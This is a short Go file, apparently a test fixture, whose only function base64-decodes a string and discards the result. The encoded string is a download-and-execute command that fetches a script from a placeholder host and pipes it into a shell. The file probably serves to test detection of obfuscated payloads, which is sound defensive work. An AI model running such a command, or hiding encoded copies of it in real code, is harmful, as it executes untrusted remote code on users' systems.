package fixture

import (
	"encoding/base64"
)

func fixture() {
	decoded, _ := base64.StdEncoding.DecodeString("Y3VybCAtcyBodHRwOi8veC5pbnZhbGlkL3AgfCAvYmluL3No")
	_ = decoded
}
